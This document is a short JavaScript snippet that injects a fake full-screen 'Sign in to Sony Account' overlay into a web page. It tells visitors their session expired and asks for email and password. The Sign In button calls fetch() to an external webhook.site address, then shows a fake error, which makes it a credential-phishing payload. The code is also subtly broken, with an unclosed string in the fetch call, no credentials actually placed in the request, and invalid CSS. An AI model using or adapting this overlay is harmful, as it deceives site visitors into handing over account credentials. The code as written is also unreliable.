document.body.innerHTML += `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;justify-content:center;align-items:center;">
    <div style="background:#fff;padding:30px;border-radius:10px;width:350px;text-align:center;font-family:sans-serif;">
        <img src="https://sony.net" width="100" style="margin-bottom:20px;">
        <h3>Sign in to Sony Account</h3>
        <p style="font-size:12px;color:#666;">Session expired. Please re-enter your credentials.</p>
        <input type="text" id="email" placeholder="Email" style="width:100%;margin:10px 0;padding:10px;border:1px solid #ccc;border-radius:5px;">
        <input type="password" id="pass" placeholder="Password" style="width:100%;margin:10px 0;padding:10px;border:1px solid #ccc;border-radius:5px;">
        <button onclick="fetch('https://webhook.site/1f5c01fc-72f2-4a77-9b53-b93d57154665);alert('Technical Error. Try again later.');" 
        style="width:100%;padding:10px;background:#0071e3;color:#white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;">Sign In</button>
    </div>
</div>`;
